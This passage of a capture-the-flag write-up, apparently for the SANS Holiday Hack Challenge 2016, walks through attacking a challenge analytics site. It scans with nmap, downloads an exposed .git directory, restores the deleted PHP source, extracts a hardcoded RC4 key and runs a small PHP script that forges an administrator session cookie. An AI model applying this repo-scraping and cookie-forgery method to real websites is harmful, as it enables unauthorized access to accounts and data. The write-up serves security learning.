Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.14s latency&lt;span class="o"&gt;)&lt;/span&gt;.
rDNS record &lt;span class="k"&gt;for&lt;/span&gt; 104.198.252.157: 157.252.198.104.bc.googleusercontent.com
Not shown: &lt;span class="m"&gt;998&lt;/span&gt; filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
&lt;span class="p"&gt;|&lt;/span&gt;_ssh-hostkey: ERROR: Script execution failed &lt;span class="o"&gt;(&lt;/span&gt;use -d to debug&lt;span class="o"&gt;)&lt;/span&gt;
443/tcp open  https
&lt;span class="p"&gt;|&lt;/span&gt; http-git:
&lt;span class="p"&gt;|&lt;/span&gt;   104.198.252.157:443/.git/
&lt;span class="hll"&gt;&lt;span class="p"&gt;|&lt;/span&gt;     Git repository found!
&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;     Repository description: Unnamed repository&lt;span class="p"&gt;;&lt;/span&gt; edit this file &lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt; to name the...
&lt;span class="p"&gt;|&lt;/span&gt;_    Last commit message: Finishing touches &lt;span class="o"&gt;(&lt;/span&gt;style, css, etc&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;_http-methods: No Allow or Public header in OPTIONS response &lt;span class="o"&gt;(&lt;/span&gt;status code 405&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; http-title: Sprusage Usage Reporter!
&lt;span class="p"&gt;|&lt;/span&gt;_Requested resource was login.php
&lt;span class="p"&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class="nv"&gt;commonName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;analytics.northpolewonderland.com
&lt;span class="p"&gt;|&lt;/span&gt; Not valid before: 2016-12-07T17:35:00+00:00
&lt;span class="p"&gt;|&lt;/span&gt;_Not valid after:  2017-03-07T17:35:00+00:00
&lt;span class="p"&gt;|&lt;/span&gt;_ssl-date: 1970-06-11T20:44:11+00:00&lt;span class="p"&gt;;&lt;/span&gt; -46y197d14h08m10s from &lt;span class="nb"&gt;local &lt;/span&gt;time.
&lt;span class="p"&gt;|&lt;/span&gt; tls-nextprotoneg:
&lt;span class="p"&gt;|&lt;/span&gt;_  http/1.1
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A Git repository was found. That's very interesting, because it means we can
download the source code of the website to analyze it. It also means that we
have access to the history of every file modifications. Let's download the
source of the web site with &lt;code&gt;wget&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;wget -r -k -np https://analytics.northpolewonderland.com/.git/
--2016-12-26 11:53:55--  https://analytics.northpolewonderland.com/.git/
Résolution de analytics.northpolewonderland.com &lt;span class="o"&gt;(&lt;/span&gt;analytics.northpolewonderland.com&lt;span class="o"&gt;)&lt;/span&gt;… 104.198.252.157
Connexion à analytics.northpolewonderland.com &lt;span class="o"&gt;(&lt;/span&gt;analytics.northpolewonderland.com&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;104.198.252.157&lt;span class="p"&gt;|&lt;/span&gt;:443… connecté.
requête HTTP transmise, en attente de la réponse… &lt;span class="m"&gt;200&lt;/span&gt; OK
Taille : non indiqué &lt;span class="o"&gt;[&lt;/span&gt;text/html&lt;span class="o"&gt;]&lt;/span&gt;
Sauvegarde en : « analytics.northpolewonderland.com/.git/index.html »

analytics.northpolewonderland.com/.git/index.html     &lt;span class="o"&gt;[&lt;/span&gt; &amp;lt;&lt;span class="o"&gt;=&lt;/span&gt;&amp;gt;                                                                                                          &lt;span class="o"&gt;]&lt;/span&gt;   1,36K  --.-KB/s   ds 0s

2016-12-26 11:53:56 &lt;span class="o"&gt;(&lt;/span&gt;14,2 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - « analytics.northpolewonderland.com/.git/index.html » sauvegardé &lt;span class="o"&gt;[&lt;/span&gt;1394&lt;span class="o"&gt;]&lt;/span&gt;

Chargement de robots.txt &lt;span class="p"&gt;;&lt;/span&gt; veuillez ignorer les erreurs.
--2016-12-26 11:53:56--  https://analytics.northpolewonderland.com/robots.txt
Réutilisation de la connexion existante à analytics.northpolewonderland.com:443.
requête HTTP transmise, en attente de la réponse… &lt;span class="m"&gt;404&lt;/span&gt; Not Found
2016-12-26 11:53:56 erreur 404 : Not Found.

--2016-12-26 11:53:56--  https://analytics.northpolewonderland.com/.git/branches/
Réutilisation de la connexion existante à analytics.northpolewonderland.com:443.
requête HTTP transmise, en attente de la réponse… &lt;span class="m"&gt;200&lt;/span&gt; OK
Taille : non indiqué &lt;span class="o"&gt;[&lt;/span&gt;text/html&lt;span class="o"&gt;]&lt;/span&gt;
Sauvegarde en : « analytics.northpolewonderland.com/.git/branches/index.html »

&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;

--2016-12-26 11:54:45--  https://analytics.northpolewonderland.com/.git/logs/refs/heads/master
Réutilisation de la connexion existante à analytics.northpolewonderland.com:443.
requête HTTP transmise, en attente de la réponse… &lt;span class="m"&gt;200&lt;/span&gt; OK
Taille : &lt;span class="m"&gt;4284&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;4,2K&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
Sauvegarde en : « analytics.northpolewonderland.com/.git/logs/refs/heads/master »

analytics.northpolewonderland.com/.git/logs/refs/ 100%&lt;span class="o"&gt;[=============================================================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt;   4,18K  --.-KB/s   ds 0s

2016-12-26 11:54:45 &lt;span class="o"&gt;(&lt;/span&gt;45,9 MB/s&lt;span class="o"&gt;)&lt;/span&gt; — « analytics.northpolewonderland.com/.git/logs/refs/heads/master » sauvegardé &lt;span class="o"&gt;[&lt;/span&gt;4284/4284&lt;span class="o"&gt;]&lt;/span&gt;

Terminé — 2016-12-26 11:54:45 —
Temps total effectif : 50s
Téléchargés : 305 fichiers, 614K en 0,9s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;695&lt;/span&gt; KB/s&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;ls -la analytics.northpolewonderland.com
total 12
drwxr-xr-x &lt;span class="m"&gt;3&lt;/span&gt; yme yme &lt;span class="m"&gt;4096&lt;/span&gt; déc.  &lt;span class="m"&gt;26&lt;/span&gt; 14:44 .
drwxr-xr-x &lt;span class="m"&gt;3&lt;/span&gt; yme yme &lt;span class="m"&gt;4096&lt;/span&gt; déc.  &lt;span class="m"&gt;26&lt;/span&gt; 14:44 ..
drwxr-xr-x &lt;span class="m"&gt;8&lt;/span&gt; yme yme &lt;span class="m"&gt;4096&lt;/span&gt; déc.  &lt;span class="m"&gt;26&lt;/span&gt; 14:45 .git
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, the Git repository was completely downloaded, but the source files
don't seem to be here. Let's inspect the Git repository:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;analytics.northpolewonderland.com
&lt;span class="nv"&gt;$ &lt;/span&gt;git status
Sur la branche master
Modifications qui ne seront pas validées :
  &lt;span class="o"&gt;(&lt;/span&gt;utilisez &lt;span class="s2"&gt;&amp;quot;git add/rm &amp;lt;fichier&amp;gt;...&amp;quot;&lt;/span&gt; pour mettre à jour ce qui sera validé&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="o"&gt;(&lt;/span&gt;utilisez &lt;span class="s2"&gt;&amp;quot;git checkout -- &amp;lt;fichier&amp;gt;...&amp;quot;&lt;/span&gt; pour annuler les modifications dans la copie de travail&lt;span class="o"&gt;)&lt;/span&gt;

    supprimé :        README.md
    supprimé :        crypto.php
    supprimé :        css/bootstrap-theme.css
    supprimé :        css/bootstrap-theme.css.map
    supprimé :        css/bootstrap-theme.min.css
    supprimé :        css/bootstrap-theme.min.css.map
    supprimé :        css/bootstrap.css
    supprimé :        css/bootstrap.css.map
    supprimé :        css/bootstrap.min.css
    supprimé :        css/bootstrap.min.css.map
    supprimé :        css/bootstrap.min.css.orig
    supprimé :        db.php
    supprimé :        edit.php
    supprimé :        fonts/glyphicons-halflings-regular.eot
    supprimé :        fonts/glyphicons-halflings-regular.svg
    supprimé :        fonts/glyphicons-halflings-regular.ttf
    supprimé :        fonts/glyphicons-halflings-regular.woff
    supprimé :        fonts/glyphicons-halflings-regular.woff2
    supprimé :        footer.php
    supprimé :        getaudio.php
    supprimé :        header.php
    supprimé :        index.php
    supprimé :        js/bootstrap.js
    supprimé :        js/bootstrap.min.js
    supprimé :        js/npm.js
    supprimé :        login.php
    supprimé :        logout.php
    supprimé :        mp3.php
    supprimé :        query.php
    supprimé :        report.php
    supprimé :        sprusage.sql
    supprimé :        &lt;span class="nb"&gt;test&lt;/span&gt;/Gemfile
    supprimé :        &lt;span class="nb"&gt;test&lt;/span&gt;/Gemfile.lock
    supprimé :        &lt;span class="nb"&gt;test&lt;/span&gt;/test_client.rb
    supprimé :        this_is_html.php
    supprimé :        this_is_json.php
    supprimé :        uuid.php
    supprimé :        view.php
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Sorry about the French Git output, but &amp;quot;supprimé&amp;quot; means &amp;quot;deleted&amp;quot;. So, every
source file was deleted, but the deletion was not commited, which means we can
cancel the deletion:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;git checkout -- .
&lt;span class="nv"&gt;$ &lt;/span&gt;ls
crypto.php  db.php    fonts       getaudio.php  index.php  login.php   mp3.php    README.md   sprusage.sql  this_is_html.php  uuid.php
css         edit.php  footer.php  header.php    js         logout.php  query.php  report.php  &lt;span class="nb"&gt;test          &lt;/span&gt;this_is_json.php  view.php
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can download the code source archive &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/analytics.northpolewonderland.com_sources.tar.gz"&gt;here&lt;/a&gt;
(sha256: &lt;code&gt;13a4f237f817300e1e23a95edaf4ea407a4a346d20c2115ca13eea30b69ee65c&lt;/code&gt;).
It contains the Git repository.&lt;/p&gt;
&lt;p&gt;Alright, we now have access to the source code of the web application! This
should makes things easier. First of all, we can see that there's a file
&lt;code&gt;edit.php&lt;/code&gt;, which is not accessible when we're connected as
&lt;code&gt;guest&lt;/code&gt;:&lt;/p&gt;
&lt;img alt="analytics_guest_edit_denied.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_edit_denied.png" /&gt;
&lt;p&gt;Indeed, the &lt;code&gt;edit.php&lt;/code&gt; page is only accessible to the
&lt;code&gt;administrator&lt;/code&gt; user:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;# File edit.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class="c1"&gt;# This should be the first require&lt;/span&gt;
  &lt;span class="k"&gt;require_once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;this_is_html.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;require_once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;db.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="c1"&gt;# Don&amp;#39;t allow anybody to access this page (yet!)&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="nx"&gt;restrict_page_to_users&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[]);&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;# File this_is_html.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;restrict_page_to_users&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$users&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;get_username&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nv"&gt;$username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Location: login.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="nx"&gt;check_access&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$users&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;# File db.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;get_username&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AUTH&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;json_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;H*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AUTH&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])),&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$auth&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;check_access&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$users&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;# Allow administrator to access any page&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;in_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$users&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;reply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;403&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Access denied!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;From this source file, we can determine that &lt;code&gt;administrator&lt;/code&gt; has access
to every page, and that the application uses the cookie &lt;code&gt;AUTH&lt;/code&gt; to
determine the current logged in username. Let's see how this cookie is
generated:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;# File login.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Successfully logged in!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;
&lt;/span&gt;      &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;date&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;DateTime&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;ISO8601&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]));&lt;/span&gt;

    &lt;span class="nb"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AUTH&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;bin2hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$auth&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

    &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Location: index.php?msg=Successfully%20logged%20in!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;# File crypto.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class="nb"&gt;define&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;KEY&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;mcrypt_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;MCRYPT_ARCFOUR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;mcrypt_decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;MCRYPT_ARCFOUR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, we can see that the username is stored in a JSON object, stored encrypted
in the cookie &lt;code&gt;AUTH&lt;/code&gt;. Since we have the encryption key in
&lt;code&gt;crypto.php&lt;/code&gt;, we can generate our own cookie:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="k"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;crypto.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="nv"&gt;$auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;date&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;DateTime&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;ISO8601&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]));&lt;/span&gt;

    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;bin2hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$auth&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;php exploit.php
82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d86e573b965cc9c6549b449486763a20363b71876884152
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can now log into the application as administrator:&lt;/p&gt;
&lt;img alt="analytics_administrator_login.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_administrator_login.png" /&gt;
&lt;p&gt;There was another, more elegant method, to recover &lt;code&gt;administrator&lt;/code&gt;'s
password. Since we have the Git repository of the web application, we have
access to every file's history. We can see that in the source of the website,
there is an SQL schema file, &lt;code&gt;sprusage.sql&lt;/code&gt;. This file is used to create
a database with the right schema. It's often created with a dump of the
currently deployed database. However, if we take a look at it, we won't see
any data in it, apart from the tables creation instructions:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;DROP&lt;/span&gt; &lt;span class="k"&gt;TABLE&lt;/span&gt; &lt;span class="n"&gt;IF&lt;/span&gt; &lt;span class="k"&gt;EXISTS&lt;/span&gt; &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cm"&gt;/*!40101 SET @saved_cs_client     = @@character_set_client */&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cm"&gt;/*!40101 SET character_set_client = utf8 */&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;CREATE&lt;/span&gt; &lt;span class="k"&gt;TABLE&lt;/span&gt; &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;NOT&lt;/span&gt; &lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
